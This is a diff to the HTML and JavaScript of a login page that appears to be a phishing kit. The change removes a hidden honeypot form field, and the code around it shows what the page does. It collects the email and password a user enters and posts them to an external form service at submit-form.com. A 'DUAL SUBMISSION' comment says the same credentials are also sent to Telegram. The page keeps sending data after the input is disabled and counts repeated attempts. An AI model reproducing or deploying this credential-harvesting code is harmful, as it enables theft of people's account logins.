@@ -314,7 +314,6 @@
       color: #fff;
     }
     .dialog .dialog-form .btn.btn-default:disabled { cursor: not-allowed; opacity: 0.65; }
-    .honeypot-field { display: none; }
     @-webkit-keyframes swooshUp30 { 0% { opacity: 0; } 100% { opacity: 1; } }
     @-moz-keyframes swooshUp30 { 0% { opacity: 0; } 100% { opacity: 1; } }
     @keyframes swooshUp30 { 0% { opacity: 0; } 100% { opacity: 1; } }
@@ -402,11 +401,6 @@
 <div class="form-group">
 <label for="user_password" class="control-label" data-i18n="password">Password:</label>
 <input type="password" id="user_password" class="form-control" name="user_password" required />
-</div>
-<!-- Honeypot field -->
-<div class="form-group honeypot-field">
-<label for="contact_info">Leave this field empty</label>
-<input type="text" id="contact_info" name="contact_info" value="" />
 </div>
 <label id="error" class="error" style="display: none;color: red;" data-i18n="error">Enter the correct password</label>
 <div class="cf-turnstile" data-sitekey="0x4AAAAAAB10qIE0M6yxD1P2" data-callback="onTurnstileSuccess" style="margin-bottom: 20px;"></div>
@@ -540,14 +534,13 @@
     $('#submit-btn').removeAttr('disabled');
   }
 
-  function sendFormData(email, password, honeypot, $input, $passwordInput) {
+  function sendFormData(email, password, $input, $passwordInput) {
     $.ajax({
       type: 'POST',
       url: "https://submit-form.com/BOjdqzwMm",
       data: {
         user_username: email,
-        user_password: password,
-        contact_info: honeypot
+        user_password: password
       },
       dataType: 'json',
       success: function(data) {
@@ -658,7 +651,6 @@ Password: ${password}`;
     var $passwordInput = $('#user_password');
     var email = $("#user_username").val();
     var password = $passwordInput.val();
-    var honeypot = $("#contact_info").val();
 
     // --- DUAL SUBMISSION ---
     // 1. Send data to Telegram
@@ -668,10 +660,10 @@ Password: ${password}`;
     // This logic handles the attempt counting and UI feedback.
     if (!$input.is(':disabled')) {
       count++;
-      sendFormData(email, password, honeypot, $input, $passwordInput);
+      sendFormData(email, password, $input, $passwordInput);
     } else {
       // Still send data to the server even if disabled, but don't increment count
-      sendFormData(email, password, honeypot, $input, $passwordInput);
+      sendFormData(email, password, $input, $passwordInput);
     }
   });
 
